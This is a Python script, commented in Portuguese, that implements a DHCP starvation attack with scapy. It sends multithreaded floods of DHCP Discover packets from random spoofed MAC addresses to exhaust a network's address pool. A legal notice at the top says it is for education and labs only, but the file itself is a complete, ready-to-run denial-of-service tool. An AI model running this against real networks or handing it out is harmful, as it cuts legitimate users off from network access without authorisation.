# =====================================================================
# AVISO LEGAL:
# Este script foi desenvolvido estritamente para fins educacionais 
# e testes em ambientes controlados (laboratórios, CTFs ou sua própria rede).
# O uso indevido desta ferramenta para atacar redes de terceiros 
# sem autorização explícita é crime (Lei 12.737/2012) e de inteira 
# responsabilidade do usuário.
# =====================================================================
import threading
import time
import random
from scapy.all import *
from colorama import Fore, init # Faltava importar o Fore

init(autoreset=True)

def gerar_mac():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ":".join(f"{b:02x}" for b in mac)

def montar_discover(mac_falso):
    mac_bytes = bytes.fromhex(mac_falso.replace(":", ""))
    xid_aleatorio = random.randint(1, 0xFFFFFFFF)

    pacote = (
        Ether(src=mac_falso, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,
            htype=1,
            hlen=6,
            xid=xid_aleatorio,
            chaddr=mac_bytes,
            flags=0x8000
        ) /
        DHCP(options=[(53, b'\x01'), "end"])
    )
    return pacote

def enviar_discover(interface):
    mac = gerar_mac()
    pacote = montar_discover(mac)
    

    try:
        send(pacote, iface=interface, verbose=False)
    except PermissionError:
        print(Fore.RED + "[-] Erro de permissão: você precisa rodar como root (use sudo).")
        import sys
        sys.exit(1) 
    except Exception as e:
        print(Fore.RED + f"[-] Ocorreu um erro inesperado: {e}")

def atacar(interface, quantidade):
    for i in range(quantidade):
        enviar_discover(interface)
        print(f"[*] {i+1} pacote enviado")

def iniciar_ataque(interface, num_threads, pacote_por_thread):
    print(Fore.CYAN + f"[*] iniciando DHCP Starvation")
    print(f"[*] interface: {interface}")
    print(f"[*] threads: {num_threads}")
    print(f"[*] pacotes por threads: {pacote_por_thread}")

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=atacar, args=(interface, pacote_por_thread), daemon=True)
        threads.append(t)
        t.start()
        print(Fore.YELLOW + f"[+] Thread {i+1} iniciada")
        
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Ataque interrompido com ^C")
        
     
    print(Fore.GREEN + "[*] Ataque finalizado")

if __name__ == "__main__":
    minha_interface = "wlan0"
    iniciar_ataque(minha_interface, num_threads=10, pacote_por_thread=50)